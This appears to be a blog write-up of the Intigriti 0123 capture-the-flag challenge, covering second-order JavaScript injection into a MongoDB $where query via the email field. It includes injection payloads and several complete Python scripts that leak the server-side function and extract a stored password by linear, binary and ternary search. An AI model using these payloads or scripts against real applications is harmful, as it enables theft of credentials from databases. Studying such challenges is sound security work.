---
title: "Intigriti 0123 Challenge Writeup - Second Order MongoDB JS Injection"
date: 2023-01-23 10:43:37
tags: [Security]
categories: [Security]
---
<img src="/img/intigriti-0123-second-order-injection/cover-en.png" style="display:none">

As usual, there is a Intigriti challenge in January, but this time it's not an XSS challenge. It's about "second order injection" which is relatively uncommon, so I decided to write a blog post.

<!-- more -->

## The challenge

https://challenge-0123.intigriti.io/challenge.html

![index page](/img/intigriti-0123-second-order-injection/p1.png)

There are only 3 simple features:

1. register and login
2. change email
3. search user

The goal is to find the flag, which is the password of one special user, the format is ` INTIGRITI{.*}`

At first, I have totally no idea what is this challenge about. I tried SQL injection to search user, but finds nothing.

Later on I found that we can use login page to create a new user(just like register), but that's all, I still don't know what to do.

Luckily, I saw two hints from the official twitter, the first one is about a fruit, the second one is about "SECOND".

When I saw the word "SECOND", I recalled a type of vulnerability called "second order SQL injection".

## What is second order SQL injection?

Assumed there is a website, you can register and login, and the website escaped your input properly, so there is no SQL injection in both register and login feature.

But, after you logged in and visit home page, it calls somehting like this in backe-end:

```sql
select * from users where username = 'YOUR_USERNAME'
```

They forgot to encode the username here, so here is vulnerable to SQL injection.

So, you can create a user with username `' or '1'='1`, then visit home page, the following SQL query will be execute:

```sql
select * from users where username = '' or '1'='1'
```

You input your SQL injection payload at one place, and got executed at another place, that is called second order SQL injection.

But, how to apply this technique to the challenge?

## Keep trying

At first, I tried to insert my SQL injection payload to the username, and then search this user to try to trigger it, but failed.

After a while, somehow I created two users(user01 and user02) with the same email, and when I searched user02, the result is user01.

It helps a lot. Becasue we know how the system works now.

When you search for a username, the system will get its email first, then use this email to search again. That is why when I searched for user02, the result is user01, because they shared the same email.

I tried a lot of payloads after knowing that the injection point is the email.

When you updating your email address, there is a validation in the back-end but it's weak, anything starts with a valid email can bypass the check. For example, `abc@abc.com' --` is also a valid email.

Following is a few payloads I have tried:

1. `abc@abc.com' --`
2. `abc@abc.com' #`
3. `abc@abc.com' /*`
4. `abc@abc.com' //`
5. `abc@abc.com" --`
6. `abc@abc.com" #`
7. `abc@abc.com" /*`
8. `abc@abc.com" //`
9. `abc@abc.com' + '1`
10. `abc@abc.com" + "1`
11. `abc@abc.com" + version() + "1`

I thought it's SQL injection at first, but after trying for about an hour, I started to think it's not.

Because the comment and the function seems not working, but somehow the string concatenation always works, so I am sure that it's injectable.

I did a little experiment to make sure I am on the right track.

I created another user(user03) and update email to `abc@abc.com1`, then update user01's email to `abc@abc.com" + "1`.

When search for user01, the result is user03, which means the injection is success.

Suddenly, an idea came to my mind: "maybe try JavaScript?", so I tried `abc@abc.com" + this + "1`, no error.

Then, I tried `abc@abc.com" + String.fromCharCode(49) + "`, the result is still user03, bingo! (`ascii('1') = 49`)

Now, I know that it's part of JavaScript, what to do next?

I tried to manually search what is available by using a boolean-based injection.

For example, `abc@abc.com" + (require ? "1" : "2") + "`, if `require` is available, the user with email `abc@abc.com1` is returned(which is user03), otherwise it returns `null` because email `abc@abc.com2` is not exist.

I found that `arguments` is available, which means we are in a function, so I want to know what is the function body.

How do we get function body without knowing the function name? Some JavaScript magic! `arguments.callee.toString()` is the answer.

We can use the same way to leak the content, like `abc@abc.com" + (arguments.callee.toString()[0] === "a" ? "1" : "2") + "` but it's quite slow, there is a better way.

First, we create what I called `oracle account`, like the following:

1. account_oracle_0 with email test@oracle.com0
2. account_oracle_1 with email test@oracle.com1
3. ...
4. account_oracle_a with email test@oracle.coma
5. account_oracle_z with email test@oracle.comz


Then, we create another account(say user_leak) with email `test@oracle.com" + arguments.callee.toString()[0]+ "`

If the result of searching user_leak is `account_oracle_a`, then I know that the first character is `a`.

Here is the full exploit script to leak the function body:

```py
import requests
import json
import concurrent.futures
import string

BASE_URL = 'https://challenge-0123.intigriti.io'
LOGIN_URL = BASE_URL + '/login.html'
EDIT_URL = BASE_URL + '/editor.html'
QUERY_URL = BASE_URL + '/api/friends?q='

SKIP_CREATE_ORACLE = 0
MAX_WORKERS = 15
charset = string.printable

def create_oracle(c):
  session = requests.session()
  session.post(LOGIN_URL, data={
    "username": "account_oracle_" + c,
    "password": "account_oracle_" + c,
  })
  resp = session.post(EDIT_URL, data={
    "email": "test@oracle.com" + c
  })
  if resp.status_code != 200:
    print(resp.status_code)
    print(resp.text)

def leak_char(index):
  payload = f'test@oracle.com" + (arguments.callee.toString()[{index}]) +"'
  session = requests.session()

  name = "account_get_" + str(index)

  session.post(LOGIN_URL, data={
    "username": name,
    "password": name
  })
  session.post(EDIT_URL, data={
    "email": payload
  })

  resp = requests.get(QUERY_URL + name)
  if resp.status_code != 200:
    print(resp.status_code)
    print(resp.text)
    return '#'

  if resp.text == 'null':
    print('Failed')
    return '#'

  data = json.loads(resp.text)
  char = data["username"].replace('account_oracle_', '')
  return char

if SKIP_CREATE_ORACLE == False:
  print("create oracle account...")
  total = len(charset)
  current = 0
  with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
      futures = {executor.submit(create_oracle, c): c for c in charset}
      for future in concurrent.futures.as_completed(futures):
          current += 1
          if current % 10 == 0 or current == total:
            print(f"Progress: {current}/{total}")

print("leaking function body")
length = 100
ans = [' '] * length
with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
    futures = {executor.submit(leak_char, i): i for i in range(length)}
    for future in concurrent.futures.as_completed(futures):
        index = futures[future]
        data = future.result()
        ans[index] = data
        print("".join(ans))



```

The result is:

``` js
function () { return this.email == "test@oracle.com" + (arguments.callee.toString()[85]) +"" }
```

So, we can assumed that the code in the back-end is something like this:

``` js
const payload = 'YOUR_EMAIL'

db.find({
  $where: `this.email === "${payload}"`
}).then(result => {
  res.json(result)
})
```

It's not possible to do RCE here because the JS code is sandboxed by MongoDB.

We can also use the similar way to see what `this` have, just change the payload from `arguments.callee.toString()` to `Object.keys[this]`, the result is:

1. id
2. username
3. password
4. friends
5. email

After knowing all the information we need, we can start to leak the flag slowly with following payload:

```
not@not_exist.ext" || (this.password.startsWith("INTIGRITI") && this.password[0] === "A" ) && "" == "
```

It creates following function:

```js
function() {
  return this.email === "not@not_exist.ext" || 
  (this.password.startsWith("INTIGRITI{") && this.password[10] === "A") &&
  "" = ""
}
```

When `this.password.startsWith("INTIGRITI{") && this.password[10] === "A"` is false, search result is `null` because nothing matched.

Otherwise, the user with matched pattern will be returned. 

Here is the exploit script to leak the flag char by char:

``` py
import requests
import json
import concurrent.futures
import string

BASE_URL = 'https://challenge-0123.intigriti.io'
LOGIN_URL = BASE_URL + '/login.html'
EDIT_URL = BASE_URL + '/editor.html'
QUERY_URL = BASE_URL + '/api/friends?q='

SKIP_CREATE_ORACLE = 0
MAX_WORKERS = 15
charset = string.printable

def leak_flag(index, char):
  session = requests.session()
  payload = f'not@not_exist.ext" || (this.password.startsWith("INTIGRITI") && this.password[{index}] === "{char}" ) && "" == "'

  name = 'account_flag_'  + char

  session.post(LOGIN_URL, data={
    "username": name,
    "password": name
  })
  session.post(EDIT_URL, data={
    "email": payload
  })

  resp = requests.get(QUERY_URL + name)
  if resp.status_code != 200:
    return False

  if resp.text == 'null' or resp.text == '[]\n':
    return False

  return char

print("leaking flag")
flag = "INTIGRITI{"
current = len(flag)
while len(flag) == 0 or flag[-1] != '}':
  should_break = False
  with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
      futures = {executor.submit(leak_flag, current, c): c for c in charset}
      for future in concurrent.futures.as_completed(futures):
          index = futures[future]
          data = future.result()
          if data != False and not should_break:
            flag += data
            should_break = True
            print(current, flag)
  current += 1

print("done")
exit()
```

![leak char by char](/img/intigriti-0123-second-order-injection/p2.png)

It takes around 10~15s to leak one character.

Can we go faster? Sure!

## Binary search to the rescue

It's boolean-based injection, the result is either found or not found, we can apply binary search to make it way faster.

It's easier to use char code to do the binary search. Also, I assumed that we know the length of flag beforehand because it's easier(we can still leak the length first in practical but I am lazy to implement it)

```py
import requests
import json
import concurrent.futures
import string
import time

BASE_URL = 'https://challenge-0123.intigriti.io'
LOGIN_URL = BASE_URL + '/login.html'
EDIT_URL = BASE_URL + '/editor.html'
QUERY_URL = BASE_URL + '/api/friends?q='

req_count = 0
def leak_flag(index):
  global req_count
  session = requests.session()
  name = 'account_flag_'  + str(index)
  session.post(LOGIN_URL, data={
    "username": name,
    "password": name
  })
  req_count += 1

  L = 33
  R = 126
  linear_mode = False
  while R>=L:
    M = (L+R) // 2
    payload = f'not@not_exist.ext" || (this.password.startsWith("INTIGRITI") && this.password.charCodeAt({index}) >= {M} ) && "" == "'
    print(f"Try leaking flag[{index}], range is {L} to {R}")

    if (R - L <= 1):
      linear_mode = True
      payload = f'not@not_exist.ext" || (this.password.startsWith("INTIGRITI") && this.password.charCodeAt({index}) === {L}  ) && "" == "'
    
    session.post(EDIT_URL, data={
      "email": payload
    })
    resp = requests.get(QUERY_URL + name)
    req_count += 2
    if resp.status_code != 200 or resp.text == 'null' or resp.text == '[]\n':
      if linear_mode: return chr(L+1)
      R = M - 1
    else:
      if linear_mode: return chr(L)
      L = M

start = time.time()
print("leaking flag...")
length = 19
flag = [' '] * length
with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
    futures = {executor.submit(leak_flag, i): i for i in range(length)}
    for future in concurrent.futures.as_completed(futures):
        index = futures[future]
        data = future.result()
        flag[index] = data
        print("".join(flag))

print(f"time: {time.time() - start}s, {req_count} requests")

```

![binary search](/img/intigriti-0123-second-order-injection/p3.png)

It takes 10s and 291 requests. It can be further improved if we ignore the prefix(`INTIGRITI{`).

Is it the end? Can we go faster? Yes!

## From binary search to ternary search

Actually, we can have 3 states. When we do something illegal (like using a undeclared variable), the server returns 500 internal error.

By leveraging this error state, we can do ternary search!

```py
import requests
import json
import concurrent.futures
import string
import time

BASE_URL = 'https://challenge-0123.intigriti.io'
LOGIN_URL = BASE_URL + '/login.html'
EDIT_URL = BASE_URL + '/editor.html'
QUERY_URL = BASE_URL + '/api/friends?q='
FLAG_CHARSET = string.printable

req_count = 0

def leak_flag(index):
  global req_count
  session = requests.session()
  name = 'account_flag_'  + str(index)
  session.post(LOGIN_URL, data={
    "username": name,
    "password": name
  })
  req_count += 1

  L = 0
  R = len(FLAG_CHARSET) - 1
  while L<=R:
    s = (R-L) // 3
    ML = L + s
    MR = L + s * 2
    if s == 0:
      MR = L + 1

    group = [
      FLAG_CHARSET[L:ML],
      FLAG_CHARSET[ML:MR],
      FLAG_CHARSET[MR:R+1]
    ]

    str1 = ''.join(group[0]).replace('"', '\\"')
    str2 = ''.join(group[1]).replace('"', '\\"')

    payload = f'not@not_exist.ext" || this.password.startsWith("INTIGRITI") && ("{str1}".includes(this.password[{index}]) ? a : ("{str2}".includes(this.password[{index}]) ? 0 : 1)) && "" == "'

    print(f"try leaking {index}", group)

    session.post(EDIT_URL, data={
      "email": payload
    })

    resp = requests.get(QUERY_URL + name)
    req_count += 2

    if resp.status_code == 500:
      R = ML
      if len(group[0]) == 1:
        return group[0]
    elif resp.text == 'null':
      L = ML
      R = MR
      if len(group[1]) == 1:
        return group[1]
    else:
      L = MR
      if len(group[2]) == 1:
        return group[2]

start = time.time()
print("leaking flag...")
length = 19
flag = [' '] * length
with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
    futures = {executor.submit(leak_flag, i): i for i in range(length)}
    for future in concurrent.futures.as_completed(futures):
        index = futures[future]
        data = future.result()
        flag[index] = data
        print("".join(flag))

print(f"time: {time.time() - start}s, {req_count} requests")
```

![ternary search](/img/intigriti-0123-second-order-injection/p4.png)

It takes 7s(-30%) and 185 requests(-36%).

Can we go faster? Probably, I am looking forwatd to seeing a faster solution. Can we reduce the request? Absolutely!

Since [sleep function](https://www.mongodb.com/docs/v4.2/reference/method/sleep/) is enabled, we can use it to introduce more states, and leak the flag in less requests theoretically, but need to wait much longer.